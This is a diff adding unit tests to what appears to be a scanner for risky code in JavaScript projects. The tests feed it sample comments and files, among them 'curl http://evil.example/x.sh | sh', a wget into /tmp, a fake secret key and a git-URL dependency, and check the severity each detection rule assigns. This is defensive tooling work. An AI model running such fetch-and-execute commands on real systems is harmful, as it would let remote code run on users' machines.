@@ -109,6 +109,62 @@ test("scanFileText keeps exec_api high when child_process is imported", () => {
   assert.equal(ex.severity, "high");
 });
 
+test("comment/doc lines downgrade code-context rules but keep secrets high", () => {
+  const res = scanFileText({
+    rel: "lib/notes.js",
+    content: [
+      "// example: curl http://evil.example/x.sh | sh",
+      "/* wget https://example.com/p -O /tmp/x */",
+      "// const key = 'sk-abcdefghijklmnopqrstuvwx';",
+      "const ok = 1;",
+    ].join("\n"),
+  });
+  const curl = res.hits.find((h) => h.rule === "download_cmd");
+  assert.ok(curl, "download_cmd should fire");
+  assert.equal(curl.severity, "low", "comment mention must be downgraded");
+  const pipe = res.hits.find((h) => h.rule === "pipe_to_shell");
+  assert.ok(pipe);
+  assert.equal(pipe.severity, "low");
+  const key = res.hits.find((h) => h.rule === "sk_key");
+  assert.ok(key, "secret in comment is still a leak");
+  assert.equal(key.severity, "high");
+});
+
+test("doc files downgrade code-context rules", () => {
+  const res = scanFileText({
+    rel: "README.md",
+    content: "Install with curl https://example.com/install.sh | sh\n\nUsage: node index.js",
+  });
+  const curl = res.hits.find((h) => h.rule === "download_cmd");
+  assert.ok(curl);
+  assert.equal(curl.severity, "low");
+});
+
+test("risky git/http dependencies are flagged", () => {
+  const res = scanFileText({
+    rel: "package.json",
+    content: JSON.stringify({
+      dependencies: { evil: "git+https://github.com/x/y.git", good: "^1.0.0" },
+    }),
+  });
+  const rd = res.hits.find((h) => h.rule === "risky_dependency");
+  assert.ok(rd, "risky dependency should fire");
+  assert.equal(rd.evidence, "dependencies.evil: git+https://github.com/x/y.git");
+  assert.equal(rd.severity, "medium");
+  assert.ok(!res.hits.some((h) => h.rule === "risky_dependency" && h.evidence.includes("good")));
+});
+
+test("minified lines are flagged low", () => {
+  const res = scanFileText({
+    rel: "dist/bundle.js",
+    content: "export const a=1;\n" + "x".repeat(5000) + "\nexport const b=2;",
+  });
+  const ml = res.hits.find((h) => h.rule === "minified_line");
+  assert.ok(ml);
+  assert.equal(ml.severity, "low");
+  assert.equal(ml.line, 2);
+});
+
 test("scanFileText flags lifecycle scripts and exfil shape", () => {
   const res = scanFileText({
     rel: "package.json",
